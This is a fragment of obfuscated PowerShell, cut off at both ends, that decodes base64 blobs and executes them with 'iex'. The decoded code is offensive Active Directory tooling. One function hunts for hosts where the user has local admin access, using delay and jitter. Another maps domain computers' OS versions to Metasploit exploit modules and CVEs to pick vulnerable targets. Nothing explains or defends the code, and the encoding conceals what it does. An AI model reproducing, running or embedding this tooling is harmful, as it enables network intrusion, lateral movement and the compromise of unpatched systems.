XJlcyAtU2NyaXB0QmxvY2sgJEhvc3RFbnVtQmxvY2sgLVNjcmlwdFBhcmFtZXRlcnMgJFNjcmlwdFBhcmFtcwogICAgICAgICAgICB9CiAgICAgICAgICAgIGVsc2UgewogICAgICAgICAgICAgICAgSW52b2tlLVRocmVhZGVkRnVuY3Rpb24gLUNvbXB1dGVyTmFtZSAkQ29tcHV0ZXJOYW1lIC1TY3JpcHRCbG9jayAkSG9zdEVudW1CbG9jayAtU2NyaXB0UGFyYW1ldGVycyAkU2NyaXB0UGFyYW1zCiAgICAgICAgICAgIH0gICAgICAgIAogICAgICAgIH0KICAgICAgICBlbHNlIHsKICAgICAgICAgICAgaWYoJFNoYXJlcyl7CiAgICAgICAgICAgICAgICAkQ29tcHV0ZXJOYW1lID0gJFNoYXJlcwogICAgICAgICAgICB9CiAgICAgICAgICAgIGVsc2VpZigtbm90ICROb1BpbmcgLWFuZCAoJENvbXB1dGVyTmFtZS5jb3VudCAtZ3QgMSkpIHsKICAgICAgICAgICAgICAgICRQaW5nID0ge3BhcmFtKCRDb21wdXRlck5hbWUpIGlmKFRlc3QtQ29ubmVjdGlvbiAtQ29tcHV0ZXJOYW1lICRDb21wdXRlck5hbWUgLUNvdW50IDEgLVF1aWV0IC1FcnJvckFjdGlvbiBTdG9wKXskQ29tcHV0ZXJOYW1lfX0KICAgICAgICAgICAgICAgICRDb21wdXRlck5hbWUgPSBJbnZva2UtVGhyZWFkZWRGdW5jdGlvbiAtTm9JbXBvcnRzIC1Db21wdXRlck5hbWUgJENvbXB1dGVyTmFtZSAtU2NyaXB0QmxvY2sgJFBpbmcgLVRocmVhZHMgMTAwCiAgICAgICAgICAgIH0KICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiWypdIFRvdGFsIG51bWJlciBvZiBhY3RpdmUgaG9zdHM6ICQoJENvbXB1dGVyTmFtZS5jb3VudCkiCiAgICAgICAgICAgICRDb3VudGVyID0gMAogICAgICAgICAgICAkQ29tcHV0ZXJOYW1lIHwgV2hlcmUtT2JqZWN0IHskX30gfCBGb3JFYWNoLU9iamVjdCB7CiAgICAgICAgICAgICAgICBXcml0ZS1WZXJib3NlICJDb21wdXRlcjogJF8iCiAgICAgICAgICAgICAgICAkQ291bnRlciA9ICRDb3VudGVyICsgMQogICAgICAgICAgICAgICAgU3RhcnQtU2xlZXAgLVNlY29uZHMgJFJhbmROby5OZXh0KCgxLSRKaXR0ZXIpKiREZWxheSwgKDErJEppdHRlcikqJERlbGF5KQogICAgICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiWypdIEVudW1lcmF0aW5nIHNlcnZlciAkXyAoJENvdW50ZXIgb2YgJCgkQ29tcHV0ZXJOYW1lLmNvdW50KSkiCiAgICAgICAgICAgICAgICBJbnZva2UtQ29tbWFuZCAtU2NyaXB0QmxvY2sgJEhvc3RFbnVtQmxvY2sgLUFyZ3VtZW50TGlzdCAkXywgJEZhbHNlLCAkRXhjbHVkZWRTaGFyZXMsICRUZXJtcywgJEV4Y2x1ZGVGb2xkZXJzLCAkT2ZmaWNlRG9jcywgJEV4Y2x1ZGVIaWRkZW4sICRGcmVzaEVYRXMsICRDaGVja1dyaXRlQWNjZXNzLCAkT3V0RmlsZSwgJFVzZVBTRHJpdmUsICRDcmVkZW50aWFsICAgICAgICAgICAgICAgIAogICAgICAgICAgICB9CiAgICAgICAgfQogICAgfQp9Cg==")))iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZnVuY3Rpb24gRmluZC1Mb2NhbEFkbWluQWNjZXNzIHsKICAgIFtDbWRsZXRCaW5kaW5nKCldCiAgICBwYXJhbSgKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uPTAsVmFsdWVGcm9tUGlwZWxpbmU9JFRydWUpXQogICAgICAgIFtBbGlhcygnSG9zdHMnKV0KICAgICAgICBbU3RyaW5nW11dCiAgICAgICAgJENvbXB1dGVyTmFtZSwKICAgICAgICBbVmFsaWRhdGVTY3JpcHQoe1Rlc3QtUGF0aCAtUGF0aCAkXyB9KV0KICAgICAgICBbQWxpYXMoJ0hvc3RMaXN0JyldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkQ29tcHV0ZXJGaWxlLAogICAgICAgIFtTdHJpbmddCiAgICAgICAgJENvbXB1dGVyRmlsdGVyLAogICAgICAgIFtTdHJpbmddCiAgICAgICAgJENvbXB1dGVyQURTcGF0aCwKICAgICAgICBbU3dpdGNoXQogICAgICAgICROb1BpbmcsCiAgICAgICAgW1VJbnQzMl0KICAgICAgICAkRGVsYXkgPSAwLAogICAgICAgIFtEb3VibGVdCiAgICAgICAgJEppdHRlciA9IC4zLAogICAgICAgIFtTdHJpbmddCiAgICAgICAgJERvbWFpbiwKICAgICAgICBbU3RyaW5nXQogICAgICAgICREb21haW5Db250cm9sbGVyLAogICAgICAgIFtTd2l0Y2hdCiAgICAgICAgJFNlYXJjaEZvcmVzdCwKICAgICAgICBbVmFsaWRhdGVSYW5nZSgxLDEwMCldIAogICAgICAgIFtJbnRdCiAgICAgICAgJFRocmVhZHMKICAgICkKICAgIGJlZ2luIHsKICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydEZWJ1ZyddKSB7CiAgICAgICAgICAgICREZWJ1Z1ByZWZlcmVuY2UgPSAnQ29udGludWUnCiAgICAgICAgfQogICAgICAgICRSYW5kTm8gPSBOZXctT2JqZWN0IFN5c3RlbS5SYW5kb20KICAgICAgICBXcml0ZS1WZXJib3NlICJbKl0gUnVubmluZyBGaW5kLUxvY2FsQWRtaW5BY2Nlc3Mgd2l0aCBkZWxheSBvZiAkRGVsYXkiCiAgICAgICAgaWYoISRDb21wdXRlck5hbWUpIHsKICAgICAgICAgICAgaWYoJERvbWFpbikgewogICAgICAgICAgICAgICAgJFRhcmdldERvbWFpbnMgPSBAKCREb21haW4pCiAgICAgICAgICAgIH0KICAgICAgICAgICAgZWxzZWlmKCRTZWFyY2hGb3Jlc3QpIHsKICAgICAgICAgICAgICAgICRUYXJnZXREb21haW5zID0gR2V0LU5ldEZvcmVzdERvbWFpbiB8IEZvckVhY2gtT2JqZWN0IHsgJF8uTmFtZSB9CiAgICAgICAgICAgIH0KICAgICAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICAgICAkVGFyZ2V0RG9tYWlucyA9IEAoIChHZXQtTmV0RG9tYWluKS5uYW1lICkKICAgICAgICAgICAgfQogICAgICAgICAgICBpZigkQ29tcHV0ZXJGaWxlKSB7CiAgICAgICAgICAgICAgICAkQ29tcHV0ZXJOYW1lID0gR2V0LUNvbnRlbnQgLVBhdGggJENvbXB1dGVyRmlsZQogICAgICAgICAgICB9CiAgICAgICAgICAgIGVsc2UgewogICAgICAgICAgICAgICAgW2FycmF5XSRDb21wdXRlck5hbWUgPSBAKCkKICAgICAgICAgICAgICAgIEZvckVhY2ggKCREb21haW4gaW4gJFRhcmdldERvbWFpbnMpIHsKICAgICAgICAgICAgICAgICAgICBXcml0ZS1WZXJib3NlICJbKl0gUXVlcnlpbmcgZG9tYWluICREb21haW4gZm9yIGhvc3RzIgogICAgICAgICAgICAgICAgICAgICRDb21wdXRlck5hbWUgKz0gR2V0LU5ldENvbXB1dGVyIC1GaWx0ZXIgJENvbXB1dGVyRmlsdGVyIC1BRFNwYXRoICRDb21wdXRlckFEU3BhdGggLURvbWFpbiAkRG9tYWluIC1Eb21haW5Db250cm9sbGVyICREb21haW5Db250cm9sbGVyCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICAgICAgJENvbXB1dGVyTmFtZSA9ICRDb21wdXRlck5hbWUgfCBXaGVyZS1PYmplY3QgeyAkXyB9IHwgU29ydC1PYmplY3QgLVVuaXF1ZSB8IFNvcnQtT2JqZWN0IHsgR2V0LVJhbmRvbSB9CiAgICAgICAgICAgIGlmKCQoJENvbXB1dGVyTmFtZS5Db3VudCkgLWVxIDApIHsKICAgICAgICAgICAgICAgIHRocm93ICJObyBob3N0cyBmb3VuZCEiCiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICAgICAgJEhvc3RFbnVtQmxvY2sgPSB7CiAgICAgICAgICAgIHBhcmFtKCRDb21wdXRlck5hbWUsICRQaW5nKQogICAgICAgICAgICAkVXAgPSAkVHJ1ZQogICAgICAgICAgICBpZigkUGluZykgewogICAgICAgICAgICAgICAgJFVwID0gVGVzdC1Db25uZWN0aW9uIC1Db3VudCAxIC1RdWlldCAtQ29tcHV0ZXJOYW1lICRDb21wdXRlck5hbWUKICAgICAgICAgICAgfQogICAgICAgICAgICBpZigkVXApIHsKICAgICAgICAgICAgICAgICRBY2Nlc3MgPSBJbnZva2UtQ2hlY2tMb2NhbEFkbWluQWNjZXNzIC1Db21wdXRlck5hbWUgJENvbXB1dGVyTmFtZQogICAgICAgICAgICAgICAgaWYgKCRBY2Nlc3MpIHsKICAgICAgICAgICAgICAgICAgICAkQ29tcHV0ZXJOYW1lCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICB9CiAgICBwcm9jZXNzIHsKICAgICAgICBpZigkVGhyZWFkcykgewogICAgICAgICAgICBXcml0ZS1WZXJib3NlICJVc2luZyB0aHJlYWRpbmcgd2l0aCB0aHJlYWRzID0gJFRocmVhZHMiCiAgICAgICAgICAgICRTY3JpcHRQYXJhbXMgPSBAewogICAgICAgICAgICAgICAgJ1BpbmcnID0gJCgtbm90ICROb1BpbmcpCiAgICAgICAgICAgIH0KICAgICAgICAgICAgSW52b2tlLVRocmVhZGVkRnVuY3Rpb24gLUNvbXB1dGVyTmFtZSAkQ29tcHV0ZXJOYW1lIC1TY3JpcHRCbG9jayAkSG9zdEVudW1CbG9jayAtU2NyaXB0UGFyYW1ldGVycyAkU2NyaXB0UGFyYW1zCiAgICAgICAgfQogICAgICAgIGVsc2UgewogICAgICAgICAgICBpZigtbm90ICROb1BpbmcgLWFuZCAoJENvbXB1dGVyTmFtZS5jb3VudCAtbmUgMSkpIHsKICAgICAgICAgICAgICAgICRQaW5nID0ge3BhcmFtKCRDb21wdXRlck5hbWUpIGlmKFRlc3QtQ29ubmVjdGlvbiAtQ29tcHV0ZXJOYW1lICRDb21wdXRlck5hbWUgLUNvdW50IDEgLVF1aWV0IC1FcnJvckFjdGlvbiBTdG9wKXskQ29tcHV0ZXJOYW1lfX0KICAgICAgICAgICAgICAgICRDb21wdXRlck5hbWUgPSBJbnZva2UtVGhyZWFkZWRGdW5jdGlvbiAtTm9JbXBvcnRzIC1Db21wdXRlck5hbWUgJENvbXB1dGVyTmFtZSAtU2NyaXB0QmxvY2sgJFBpbmcgLVRocmVhZHMgMTAwCiAgICAgICAgICAgIH0KICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiWypdIFRvdGFsIG51bWJlciBvZiBhY3RpdmUgaG9zdHM6ICQoJENvbXB1dGVyTmFtZS5jb3VudCkiCiAgICAgICAgICAgICRDb3VudGVyID0gMAogICAgICAgICAgICBGb3JFYWNoICgkQ29tcHV0ZXIgaW4gJENvbXB1dGVyTmFtZSkgewogICAgICAgICAgICAgICAgJENvdW50ZXIgPSAkQ291bnRlciArIDEKICAgICAgICAgICAgICAgIFN0YXJ0LVNsZWVwIC1TZWNvbmRzICRSYW5kTm8uTmV4dCgoMS0kSml0dGVyKSokRGVsYXksICgxKyRKaXR0ZXIpKiREZWxheSkKICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIlsqXSBFbnVtZXJhdGluZyBzZXJ2ZXIgJENvbXB1dGVyICgkQ291bnRlciBvZiAkKCRDb21wdXRlck5hbWUuY291bnQpKSIKICAgICAgICAgICAgICAgIEludm9rZS1Db21tYW5kIC1TY3JpcHRCbG9jayAkSG9zdEVudW1CbG9jayAtQXJndW1lbnRMaXN0ICRDb21wdXRlciwgJEZhbHNlLCAkT3V0RmlsZSwgJERvbWFpblNJRCwgJFRydXN0R3JvdXBzU0lEcwogICAgICAgICAgICB9CiAgICAgICAgfQogICAgfQp9Cg==")))iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZnVuY3Rpb24gR2V0LUV4cGxvaXRhYmxlU3lzdGVtIHsKICAgIFtDbWRsZXRCaW5kaW5nKCldCiAgICBQYXJhbSgKICAgICAgICBbUGFyYW1ldGVyKFZhbHVlRnJvbVBpcGVsaW5lPSRUcnVlKV0KICAgICAgICBbQWxpYXMoJ0hvc3ROYW1lJyldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkQ29tcHV0ZXJOYW1lID0gJyonLAogICAgICAgIFtTdHJpbmddCiAgICAgICAgJFNQTiwKICAgICAgICBbU3RyaW5nXQogICAgICAgICRPcGVyYXRpbmdTeXN0ZW0gPSAnKicsCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkU2VydmljZVBhY2sgPSAnKicsCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkRmlsdGVyLAogICAgICAgIFtTd2l0Y2hdCiAgICAgICAgJFBpbmcsCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkRG9tYWluLAogICAgICAgIFtTdHJpbmddCiAgICAgICAgJERvbWFpbkNvbnRyb2xsZXIsCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkQURTcGF0aCwKICAgICAgICBbU3dpdGNoXQogICAgICAgICRVbmNvbnN0cmFpbmVkLAogICAgICAgIFtWYWxpZGF0ZVJhbmdlKDEsMTAwMDApXSAKICAgICAgICBbSW50XQogICAgICAgICRQYWdlU2l6ZSA9IDIwMAogICAgKQogICAgV3JpdGUtVmVyYm9zZSAiWypdIEdyYWJiaW5nIGNvbXB1dGVyIGFjY291bnRzIGZyb20gQWN0aXZlIERpcmVjdG9yeS4uLiIKICAgICRUYWJsZUFkc0NvbXB1dGVycyA9IE5ldy1PYmplY3QgU3lzdGVtLkRhdGEuRGF0YVRhYmxlIAogICAgJE51bGwgPSAkVGFibGVBZHNDb21wdXRlcnMuQ29sdW1ucy5BZGQoJ0hvc3RuYW1lJykgICAgICAgCiAgICAkTnVsbCA9ICRUYWJsZUFkc0NvbXB1dGVycy5Db2x1bW5zLkFkZCgnT3BlcmF0aW5nU3lzdGVtJykKICAgICROdWxsID0gJFRhYmxlQWRzQ29tcHV0ZXJzLkNvbHVtbnMuQWRkKCdTZXJ2aWNlUGFjaycpCiAgICAkTnVsbCA9ICRUYWJsZUFkc0NvbXB1dGVycy5Db2x1bW5zLkFkZCgnTGFzdExvZ29uJykKICAgIEdldC1OZXRDb21wdXRlciAtRnVsbERhdGEgQFBTQm91bmRQYXJhbWV0ZXJzIHwgRm9yRWFjaC1PYmplY3QgewogICAgICAgICRDdXJyZW50SG9zdCA9ICRfLmRuc2hvc3RuYW1lCiAgICAgICAgJEN1cnJlbnRPcyA9ICRfLm9wZXJhdGluZ3N5c3RlbQogICAgICAgICRDdXJyZW50U3AgPSAkXy5vcGVyYXRpbmdzeXN0ZW1zZXJ2aWNlcGFjawogICAgICAgICRDdXJyZW50TGFzdCA9ICRfLmxhc3Rsb2dvbgogICAgICAgICRDdXJyZW50VWFjID0gJF8udXNlcmFjY291bnRjb250cm9sCiAgICAgICAgJEN1cnJlbnRVYWNCaW4gPSBbY29udmVydF06OlRvU3RyaW5nKCRfLnVzZXJhY2NvdW50Y29udHJvbCwyKQogICAgICAgICREaXNhYmxlT2Zmc2V0ID0gJEN1cnJlbnRVYWNCaW4uTGVuZ3RoIC0gMgogICAgICAgICRDdXJyZW50RGlzYWJsZWQgPSAkQ3VycmVudFVhY0Jpbi5TdWJzdHJpbmcoJERpc2FibGVPZmZzZXQsMSkKICAgICAgICBpZiAoJEN1cnJlbnREaXNhYmxlZCAgLWVxIDApIHsKICAgICAgICAgICAgJE51bGwgPSAkVGFibGVBZHNDb21wdXRlcnMuUm93cy5BZGQoJEN1cnJlbnRIb3N0LCRDdXJyZW50T1MsJEN1cnJlbnRTUCwkQ3VycmVudExhc3QpCiAgICAgICAgfQogICAgfQogICAgV3JpdGUtVmVyYm9zZSAiWypdIExvYWRpbmcgZXhwbG9pdCBsaXN0IGZvciBjcml0aWNhbCBtaXNzaW5nIHBhdGNoZXMuLi4iCiAgICAkVGFibGVFeHBsb2l0cyA9IE5ldy1PYmplY3QgU3lzdGVtLkRhdGEuRGF0YVRhYmxlIAogICAgJE51bGwgPSAkVGFibGVFeHBsb2l0cy5Db2x1bW5zLkFkZCgnT3BlcmF0aW5nU3lzdGVtJykgCiAgICAkTnVsbCA9ICRUYWJsZUV4cGxvaXRzLkNvbHVtbnMuQWRkKCdTZXJ2aWNlUGFjaycpCiAgICAkTnVsbCA9ICRUYWJsZUV4cGxvaXRzLkNvbHVtbnMuQWRkKCdNc2ZNb2R1bGUnKSAgCiAgICAkTnVsbCA9ICRUYWJsZUV4cGxvaXRzLkNvbHVtbnMuQWRkKCdDVkUnKQogICAgJE51bGwgPSAkVGFibGVFeHBsb2l0cy5Sb3dzLkFkZCgiV2luZG93cyA3IiwiIiwiZXhwbG9pdC93aW5kb3dzL3NtYi9tczEwXzA2MV9zcG9vbHNzIiwiaHR0cDovL3d3dy5jdmVkZXRhaWxzLmNvbS9jdmUvMjAxMC0yNzI5IikgIAogICAgJE51bGwgPSAkVGFibGVFeHBsb2l0cy5Sb3dzLkFkZCgiV2luZG93cyBTZXJ2ZXIgMjAwMCIsIlNlcnZlciBQYWNrIDEiLCJleHBsb2l0L3dpbmRvd3MvZGNlcnBjL21zMDNfMDI2X2Rjb20iLCJodHRwOi8vd3d3LmN2ZWRldGFpbHMuY29tL2N2ZS8yMDAzLTAzNTIvIikgIAogICAgJE51bGwgPSAkVGFibGVFeHBsb2l0cy5Sb3dzLkFkZCgiV2luZG93cyBTZXJ2ZXIgMjAwMCIsIlNlcnZlciBQYWNrIDEiLCJleHBsb2l0L3dpbmRvd3MvZGNlcnBjL21zMDVfMDE3X21zbXEiLCJodHRwOi8vd3d3LmN2ZWRldGFpbHMuY29tL2N2ZS8yMDA1LTAwNTkiKSAgCiAgICAkTnVsbCA9ICRUYWJsZUV4cGxvaXRzLlJvd3MuQWRkKCJXaW5kb3dzIFNlcnZlciAyMDAwIiwiU2VydmVyIFBhY2sgMSIsImV4cGxvaXQvd2luZG93cy9paXMvbXMwM18wMDdfbnRkbGxfd2ViZGF2IiwiaHR0cDovL3d3dy5jdmVkZXRhaWxzLmNvbS9jdmUvMjAwMy0wMTA5IikgIAogICAgJE51bGwgPSAkVGFibGVFeHBsb2l0cy5Sb3dzLkFkZCgiV2luZG93cyBTZXJ2ZXIgMjAwMCIsIlNlcnZlciBQYWNrIDEiLCJleHBsb2l0L3dpbmRvd3Mvd2lucy9tczA0XzA0NV93aW5zIiwiaHR0cDovL3d3dy5jdmVkZXRhaWxzLmNvbS9jdmUvMjAwNC0xMDgwLyIpICAKICAgICROdWxsID0gJFRhYmxlRXhwbG9pdHMuUm93cy5BZGQoIldpbmRvd3MgU2VydmVyIDIwMDAiLCJTZXJ2aWNlIFBhY2sgMiIsImV4cGxvaXQvd2luZG93cy9kY2VycGMvbXMwM18wMjZfZGNvbSIsImh0dHA6Ly93d3cuY3ZlZGV0YWlscy5jb20vY3ZlLzIwMDMtMDM1Mi8iKSAgCiAgICAkTnVsbCA9ICRUYWJsZUV4cGxvaXRzLlJvd3MuQWRkKCJXaW5kb3dzIFNlcnZlciAyMDAwIiwiU2VydmljZSBQYWNrIDIiLCJleHBsb2l0L3dpbmRvd3MvZGNlcnBjL21zMDVfMDE3X21zbXEiLCJodHRwOi8vd3d3LmN2ZWRldGFpbHMuY29tL2N2ZS8yMDA1LTAwNTkiKSAgCiAgICAkTnVsbCA9ICRUYWJsZUV4cGxvaXRzLlJvd3MuQWRkKCJXaW5kb3dzIFNlcnZlciAyMDAwIiwiU2VydmljZSBQYWNrIDIiLCJleHBsb2l0L3dpbmRvd3MvaWlzL21zMDNfMDA3X250ZGxsX3dlYmRhdiIsImh0dHA6Ly93d3cuY3ZlZGV0YWlscy5jb20vY3ZlLzIwMDMtMDEwOSIpICAKICAgICROdWxsID0gJFRhYmxlRXhwbG9pdHMuUm93cy5BZGQoIldpbmRvd3MgU2VydmVyIDIwMDAiLCJTZXJ2aWNlIFBhY2sgMiIsImV4cGxvaXQvd2luZG93cy9zbWIvbXMwNF8wMTFfbHNhc3MiLCJodHRwOi8vd3d3LmN2ZWRldGFpbHMuY29tL2N2ZS8yMDAzLTA1MzMvIikgIAogICAgJE51bGwgPSAkVGFibGVFeHBsb2l0cy5Sb3dzLkFkZCgiV2luZG93cyBTZXJ2ZXIgMjAwMCIsIlNlcnZpY2UgUGFjayAyIiwiZXhwbG9pdC93aW5kb3dzL3dpbnMvbXMwNF8wNDVfd2lucyIsImh0dHA6Ly93d3cuY3ZlZGV0YWlscy5jb20vY3ZlLzIwMDQtMTA4MC8iKSAgCiAgICAkTnVsbCA9ICRUYWJsZUV4cGxvaXRzLlJvd3MuQWRkKCJXaW5kb3dzIFNlcnZlciAyMDAwIiwiU2VydmljZSBQYWNrIDMiLCJleHBsb2l0L3dpbmRvd3MvZGNlcnBjL21zMDNfMDI2X2Rjb20iLCJodHRwOi8vd3d3LmN2ZWRldGFpbHMuY29tL2N2ZS8yMDAzLTAzNTIvIikgIAogICAgJE51bGwgPSAkVGFibGVFeHBsb2l0cy5Sb3dzLkFkZCgiV2luZG93cyBTZXJ2ZXIgMjAwMCIsIlNlcnZpY2UgUGFjayAzIiwiZXhwbG9pdC93aW5kb3dzL2RjZXJwYy9tczA1XzAxN19tc21xIiwiaHR0cDovL3d3dy5jdmVkZXRhaWxzLmNvbS9jdmUvMjAwNS0wMDU5IikgIAogICAgJE51bGwgPSAkVGFibGVFeHBsb2l0cy5Sb3dzLkFkZCgiV2luZG93cyBTZXJ2ZXIgMjAwMCIsIlNlcnZpY2UgUGFjayAzIiwiZXhwbG9pdC93aW5kb3dzL2lpcy9tczAzXzAwN19udGRsbF93ZWJkYXYiLCJodHRwOi8vd3d3LmN2ZWRldGFpbHMuY29tL2N2ZS8yMDAzLTAxMDkiKSAgCiAgICAkTnVsbCA9ICRUYWJsZUV4cGxvaXRzLlJvd3MuQWRkKCJXaW5kb3dzIFNlcnZlciAyMDAwIiwiU2VydmljZSBQYWNrIDMiLCJleHBsb2l0L3dpbmRvd3Mvd2lucy9tczA0XzA0NV93aW5zIiwiaHR0cDovL3d3dy5jdmVkZXRhaWxzLmNvbS9jdmUvMjAwNC0xMDgwLyIpICAKICAgICROdWxsID0gJFRhYmxlRXhwbG9pdHMuUm93cy5BZGQoIldpbmRvd3MgU2VydmVyIDIwMDAiLCJTZXJ2aWNlIFBhY2sgNCIsImV4cGxvaXQvd2luZG93cy9kY2VycGMvbXMwM18wMjZfZGNvbSIsImh0dHA6Ly93d3cuY3ZlZGV0YWlscy5jb20vY3ZlLzIwMDMtMDM1Mi8iKSAgCiAgICAkTnVsbCA9ICRUYWJsZUV4cGxvaXRzLlJvd3MuQWRkKCJXaW5kb3dzIFNlcnZlciAyMDAwIiwiU2VydmljZSBQYWNrIDQiLCJleHBsb2l0L3dpbmRvd3MvZGNlcnBjL21zMDVfMDE3X21zbXEiLCJodHRwOi8vd3d3LmN2ZWRldGFpbHMuY29tL2N2ZS8yMDA1LTAwNTkiKSAgCiAgICAkTnVsbCA9ICRUYWJsZUV4cGxvaXRzLlJvd3MuQWRkKCJXaW5kb3dzIFNlcnZlciAyMDAwIiwiU2VydmljZSBQYWNrIDQiLCJleHBsb2l0L3dpbmRvd3MvZGNlcnBjL21zMDdfMDI5X21zZG5zX3pvbmVuYW1lIiwiaHR0cDovL3d3dy5jdmVkZXRhaWxzLmNvbS9jdmUvMjAwNy0xNzQ4IikgIAogICAgJE51bGwgPSAkVGFibGVFeHBsb2l0cy5Sb3dzLkFkZCgiV2luZG93cyBTZXJ2ZXIgMjAwMCIsIlNlcnZpY2UgUGFjayA0IiwiZXhwbG9pdC93aW5kb3dzL3NtYi9tczA0XzAxMV9sc2FzcyIsImh0dHA6Ly93d3cuY3ZlZGV0YWlscy5jb20vY3ZlLzIwMDMtMDUzMy8iKSAgCiAgICAkTnVsbCA9ICRUYWJsZUV4cGxvaXRzLlJvd3MuQWRkKCJXaW5kb3dzIFNlcnZlciAyMDAwIiwiU2VydmljZSBQYWNrIDQiLCJleHBsb2l0L3dpbmRvd3Mvc21iL21zMDZfMDQwX25ldGFwaSIsImh0dHA6Ly93d3cuY3ZlZGV0YWlscy5jb20vY3ZlLzIwMDYtMzQzOSIpICAKICAgICROdWxsID0gJFRhYmxlRXhwbG9pdHMuUm93cy5BZGQoIldpbmRvd3MgU2VydmVyIDIwMDAiLCJTZXJ2aWNlIFBhY2sgNCIsImV4cGxvaXQvd2luZG93cy9zbWIvbXMwNl8wNjZfbndhcGkiLCJodHRwOi8vd3d3LmN2ZWRldGFpbHMuY29tL2N2ZS8yMDA2LTQ2ODgiKSAgCiAgICAkTnVsbCA9ICRUYWJsZUV4cGxvaXRzLlJvd3MuQWRkKCJXaW5kb3dzIFNlcnZlciAyMDAwIiwiU2VydmljZSBQYWNrIDQiLCJleHBsb2l0L3dpbmRvd3Mvc21iL21zMDZfMDcwX3drc3N2YyIsImh0dHA6Ly93d3cuY3ZlZGV0YWlscy5jb20vY3ZlLzIwMDYtNDY5MSIpICAKICAgICROdWxsID0gJFRhYmxlRXhwbG9pdHMuUm93cy5BZGQoIldpbmRvd3MgU2VydmVyIDIwMDAiLCJTZXJ2aWNlIFBhY2sgNCIsImV4cGxvaXQvd2luZG93cy9zbWIvbXMwOF8wNjdfbmV0YXBpIiwiaHR0cDovL3d3dy5jdmVkZXRhaWxzLmNvbS9jdmUvMjAwOC00MjUwIikgIAogICAgJE51bGwgPSAkVGFibGVFeHBsb2l0cy5Sb3dzLkFkZCgiV2luZG93cyBTZXJ2ZXIgMjAwMCIsIlNlcnZpY2UgUGFjayA0IiwiZXhwbG9pdC93aW5kb3dzL3dpbnMvbXMwNF8wNDVfd2lucyIsImh0dHA6Ly93d3cuY3ZlZGV0YWlscy5jb20vY3ZlLzIwMDQtMTA4MC8iKSAgCiAgICAkTnVsbCA9ICRUYWJsZUV4cGxvaXRzLlJvd3MuQWRkKCJXaW5kb3dzIFNlcnZlciAyMDAwIiwiIiwiZXhwbG9pdC93aW5kb3dzL2RjZXJwYy9tczAzXzAyNl9kY29tIiwiaHR0cDovL3d3dy5jdmVkZXRhaWxzLmNvbS9jdmUvMjAwMy0wMzUyLyIpICAKICAgICROdWxsID0gJFRhYmxlRXhwbG9pdHMuUm93cy5BZGQoIldpbmRvd3MgU2VydmVyIDIwMDAiLCIiLCJleHBsb2l0L3dpbmRvd3MvZGNlcnBjL21zMDVfMDE3X21zbXEiLCJodHRwOi8vd3d3LmN2ZWRldGFpbHMuY29tL2N2ZS8yMDA1LTAwNTkiKSAgCiAgICAkTnVsbCA9ICRUYWJsZUV4cGxvaXRzLlJvd3MuQWRkKCJXaW5kb3dzIFNlcnZlciAyMDAwIiwiIiwiZXhwbG9pdC93aW5kb3dzL2lpcy9tczAzXzAwN19udGRsbF93ZWJkYXYiLCJodHRwOi8vd3d3LmN2ZWRldGFpbHMuY29tL2N2ZS8yMDAzLTAxMDkiKSAgCiAgICAkTnVsbCA9ICRUYWJsZUV4cGxvaXRzLlJvd3MuQWRkKCJXaW5kb3dzIFNlcnZlciAyMDAwIiwiIiwiZXhwbG9pdC93aW5kb3dzL3NtYi9tczA1XzAzOV9wbnAiLCJodHRwOi8vd3d3LmN2ZWRldGFpbHMuY29tL2N2ZS8yMDA1LTE5ODMiKSAgCiAgICAkTnVsbCA9ICRUYWJsZUV4cGxvaXRzLlJvd3MuQWRkKCJXaW5kb3dzIFNlcnZlciAyMDAwIiwiIiwiZXhwbG9pdC93aW5kb3dzL3dpbnMvbXMwNF8wNDVfd2lucyIsImh0dHA6Ly93d3cuY3ZlZGV0YWlscy5jb20vY3ZlLzIwMDQtMTA4MC8iKSAgCiAgICAkTnVsbCA9ICRUYWJsZUV4cGxvaXRzLlJvd3MuQWRkKCJXaW5kb3dzIFNlcnZlciAyMDAzIiwiU2VydmVyIFBhY2sgMSIsImV4cGxvaXQvd2luZG93cy9kY2VycGMvbXMwN18wMjlfbXNkbnNfem9uZW5hbWUiLCJodHRwOi8vd3d3LmN2ZWRldGFpbHMuY29tL2N2ZS8yMDA3LTE3NDgiKSAgCiAgICAkTnVsbCA9ICRUYWJsZUV4cGxvaXRzLlJvd3MuQWRkKCJXaW5kb3dzIFNlcnZlciAyMDAzIiwiU2VydmVyIFBhY2sgMSIsImV4cGxvaXQvd2luZG93cy9zbWIvbXMwNl8wNDBfbmV0YXBpIiwiaHR0cDovL3d3dy5jdmVkZXRhaWxzLmNvbS9jdmUvMjAwNi0zNDM5IikgIAogICAgJE51bGwgPSAkVGFibGVFeHBsb2l0cy5Sb3dzLkFkZCgiV2luZG93cyBTZXJ2ZXIgMjAwMyIsIlNlcnZlciBQYWNrIDEiLCJleHBsb2l0L3dpbmRvd3Mvc21iL21zMDZfMDY2X253YXBpIiwiaHR0cDovL3d3dy5jdmVkZXRhaWxzLmNvbS9jdmUvMjAwNi00Njg4IikgIAogICAgJE51bGwgPSAkVGFibGVFeHBsb2l0cy5Sb3dzLkFkZCgiV2luZG93cyBTZXJ2ZXIgMjAwMyIsIlNlcnZlciBQYWNrIDEiLCJleHBsb2l0L3dpbmRvd3Mvc21iL21zMDhfMDY3X25ldGFwaSIsImh0dHA6Ly93d3cuY3ZlZGV0YWlscy5jb20vY3ZlLzIwMDgtNDI1MCIpICAKICAgICROdWxsID0gJFRhYmxlRXhwbG9pdHMuUm93cy5BZGQoIldpbmRvd3MgU2VydmVyIDIwMDMiLCJTZXJ2ZXIgUGFjay